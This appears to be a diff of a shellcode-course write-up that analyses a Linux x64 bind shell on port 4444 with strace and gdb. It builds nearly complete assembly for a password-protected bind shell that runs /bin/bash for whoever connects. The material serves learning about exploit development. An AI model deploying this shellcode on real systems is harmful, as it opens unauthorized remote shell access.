@@ -275,7 +275,6 @@ socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
 bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
 listen(3, 0)                            = 0
 accept(3, NULL, NULL
-
 ```
 
 + We can see our program hangs at `accept(`. 
@@ -287,7 +286,6 @@ dup2(4, 0)                              = 0
 dup2(4, 1)                              = 1
 dup2(4, 2)                              = 2
 execve("/bin/bash", NULL, NULL)         = 0
-
 ```
 
 + The accept function takes in the socket handle returned from `socket()`, and returns a new socket handle `4` that will be used for the client connection.
@@ -310,7 +308,6 @@ dup2(4, 0)                                           = 0
 dup2(4, 1)                                           = 1
 dup2(4, 2)                                           = 2
 execve(0x5597bd4ce004, 0, 0, 0x7f05dffe8027 <no return ...>
-
 ```
 
 ## GDB Analysis
@@ -326,7 +323,6 @@ execve(0x5597bd4ce004, 0, 0, 0x7f05dffe8027 <no return ...>
 ```bash
 root# gdb ./bindshell
 GNU gdb (Debian 8.3.1-1) 8.3.1
-
 gdb-peda$ info functions
 0x0000000000001030  htons@plt
 0x0000000000001040  dup2@plt
@@ -336,7 +332,6 @@ gdb-peda$ info functions
 0x0000000000001080  bind@plt
 0x0000000000001090  accept@plt
 0x00000000000010a0  socket@plt
-
 gdb-peda$ break bind@plt
 Breakpoint 1 at 0x1080
 gdb-peda$ run
@@ -360,10 +355,8 @@ RDI: 0x3
 
 ```bash 
 RSI: 0x7fffffffe130 --> 0x5c110002
-
 gdb-peda$ hexdump 0x7fffffffe130 16
 0x00007fffffffe130 : 02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00
-
 ```
 
 ##### RDX = `socklen_t addrlen`
@@ -390,16 +383,13 @@ root# gcc bindshell.c -o bshell2
 root# gdb ./bshell2
 gdb-peda$ b bind@plt
 gdb-peda$ r
-
 ### STACK ###
 0008| 0x7fffffffe130 --> 0xc18080405c110002
 0016| 0x7fffffffe138 --> 0x0
-
 ### MEMORY EXAMINE ###
 gdb-peda$ x/16b 0x00007fffffffe130
 0x7fffffffe130: 0x02    0x00    0x11    0x5c    0x40    0x80    0x80    0xc1
 0x7fffffffe138: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
-
 gdb-peda$ hexdump 0x00007fffffffe130 16
 0x00007fffffffe130 : 02 00 11 5c 40 80 80 c1 00 00 00 00 00 00 00 00
 ```
@@ -457,7 +447,6 @@ gdb-peda$ r
 ; rdi = 0x2  = AF_INET
 ; rsi = 0x1  = SOCK_STREAM
 ; rdx = 0x0  = IPPROTO_IP
-
 xor rsi, rsi   ; clear rsi
 mul rsi        ; clear rax, rdx ; rdx = 0x0 = IPPROTO_IP
 inc rsi        ; rsi = 0x1 = SOCK_STREAM
@@ -481,7 +470,6 @@ push rax       ; [RSP] = sockfd
 # stuct sockaddr breakdown
          02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00 
 Address-Family| PORT| IP Address| 8 bytes of zeros
-
 ```
 
 - Address-Family = `02 00`
@@ -500,7 +488,6 @@ Address-Family| PORT| IP Address| 8 bytes of zeros
 ;          02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00
 ; Address-Family| PORT| IP Address| 8 bytes of zeros
 ; rdx = 0x10 
-
 xchg rdi, rax    ; RDI = sockfd / ipv4Socket
 xor rax, rax
 add al, 0x31     ; rax = 0x31 = socket syscall
@@ -526,11 +513,9 @@ root# gdb ./bindshell
    0x401028 <_start+40>:        push   dx
    0x40102a <_start+42>:        mov    rsi,rsp
 => 0x40102d <_start+45>:        syscall
-
 gdb-peda$ x/16x $rsp
 0x7fffffffe1f0: 0x02    0x00    0x11    0x5c    0x00    0x00    0x00    0x00
 0x7fffffffe1f8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
-
 gdb-peda$ hexdump $rsp 16
 0x00007fffffffe1f0 : 02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00   ...\............
 ```
@@ -556,7 +541,6 @@ gdb-peda$ hexdump $rsp 16
 ; rax = 0x32    = listen syscall
 ; rdi = sockfd  = 0x3 = ipv4Socket
 ; rsi = backlog = 0
-
 xor rax, rax
 add al, 0x32
 xor rdi, rdi
@@ -589,7 +573,6 @@ syscall
 ; rdi = sockfd  = 0x3 = ipv4Socket
 ; rsi = 0x0
 ; rdx = 0x0
-
 xor rax, rax
 push rax
 push rax
@@ -641,7 +624,6 @@ syscall       ; accept returns client socket file-descriptor in RAX
 xchg rdi, rax    ; RDI = sockfd / ClientSocketFD
 xor rsi, rsi
 add dl, 0x3      ; Loop Counter
-
 dup2Loop:
 xor rax, rax
 add al, 0x21     ; RAX = 0x21 = dup2 systemcall
@@ -691,7 +673,6 @@ i;execve
 ;sab/nib/ : 7361622f6e69622f
 ; rsi = 0x0
 ; rdx = 0x0
-
 xor rsi, rsi
 mul rsi          ; rdx&rax= 0x0
 xor rdi, rdi
@@ -710,16 +691,13 @@ syscall  ; call execve("/bin/bash", NULL, NULL)
 
 ```nasm
 global _start
-
 section .text
-
 _start:
 ; int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 ; rax = 0x29
 ; rdi = 0x2  = AF_INET
 ; rsi = 0x1  = SOCK_STREAM
 ; rdx = 0x0  = IPPROTO_IP
-
 xor rsi, rsi   ; clear rsi
 mul rsi        ; clear rax, rdx ; rdx = 0x0 = IPPROTO_IP
 add al, 0x29   ; rax = 0x29 = socket syscall
@@ -728,7 +706,6 @@ push rsi
 pop rdi        ; rdi = 0x1
 inc rdi        ; rdi = 0x2 = AF_INET
 syscall        ; socket syscall ; RAX returns socket File-Descriptor
-
 ; bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
 ; rax = 0x31
 ; rdi = 0x3  =  ipv4Socket
@@ -736,7 +713,6 @@ syscall        ; socket syscall ; RAX returns socket File-Descriptor
 ;          02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00
 ; Address-Family| PORT| IP Address| 8 bytes of zeros
 ; rdi = 0x10
-
 xchg rdi, rax    ; RDI = sockfd / ipv4Socket
 xor rax, rax
 add al, 0x31     ; rax = 0x31 = socket syscall
@@ -750,23 +726,19 @@ push dx          ; 0x2 = AF_INET
 add dl, 0xe      ; rdi = 0x10 = sizeof(ipSocketAddr)
 mov rsi, rsp     ; rsi = &ipSocketAddr
 syscall
-
 ; int listen(int sockfd, int backlog);
 ; rax = 0x32    = listen syscall
 ; rdi = sockfd  = 0x3 = ipv4Socket
 ; rsi = backlog = 0
-
 xor rax, rax
 add al, 0x32
 xor rsi, rsi
 syscall
-
 ;accept
 ; rax = 0x2b
 ; rdi = sockfd  = 0x3 = ipv4Socket
 ; rsi = 0x0
 ; rdx = 0x0
-
 xor rax, rax
 push rax
 push rax
@@ -774,12 +746,10 @@ pop rdx
 pop rsi
 add al, 0x2b
 syscall       ; accept returns client socket file-descriptor in RAX
-
 ; dup2
 xchg rdi, rax    ; RDI = sockfd / ClientSocketFD
 xor rsi, rsi
 add dl, 0x3      ; Loop Counter
-
 dup2Loop:
 xor rax, rax
 add al, 0x21     ; RAX = 0x21 = dup2 systemcall
@@ -787,9 +757,7 @@ syscall          ; call dup2 x3 to redirect STDIN STDOUT STDERR
 inc rsi
 cmp rsi, rdx     ; if 2-STDERR, end loop
 jne dup2Loop
-
 jmp short password
-
 failer:
 ; write
 ; rax = 0x1
@@ -799,7 +767,6 @@ failer:
 ;root# python reverse.py "REALLY?!"
 ;String length : 8
 ;!?YLLAER : 213f594c4c414552
-
 xor rdi, rdi
 mul rdi
 push rdi
@@ -812,7 +779,6 @@ inc rax         ; rax = 0x1 = write system call
 mov rdi, rax
 add rdx, 16     ; 16 bytes / size of string
 syscall
-
 password:
 ; write
 ; rax = 0x1
@@ -823,7 +789,6 @@ password:
 ;String length : 16
 ;??ZI zDr : 3f3f5a49207a4472
 ;OW C1G@M : 4f5720433147404d
-
 xor rdi, rdi
 mul rdi
 push rdi
@@ -838,7 +803,6 @@ inc rax         ; rax = 0x1 = write system call
 mov rdi, rax
 add rdx, 16     ; 16 bytes / size of string
 syscall
-
 ; read
 ; rax = 0x0 = read systemcall
 ; rdi = fd = 0x0 STDIN
@@ -850,7 +814,6 @@ mul rdi         ; rdx =0x0 ; rax = 0x0 = write system call
 mov rsi, rsp    ; rsi = [RSP] = &String
 add rdx, 12     ; 12 bytes / size of password
 syscall
-
 ; String = P3WP3Wl4ZerZ
 ;   String length : 12
 ;     ZreZ : 5a72655a
@@ -866,7 +829,6 @@ xor rcx, rcx
 add rcx, 0xB
 repe cmpsb
 jnz failer
-
 ;execve
 ; rax = 0x3b
 ; rdi = Pointer -> "/bin/bash"0x00
@@ -876,7 +838,6 @@ jnz failer
 ;sab/nib/ : 7361622f6e69622f
 ; rsi = 0x0
 ; rdx = 0x0
-
 xor rsi, rsi
 mul rsi          ; rdx&rax= 0x0
 xor rdi, rdi
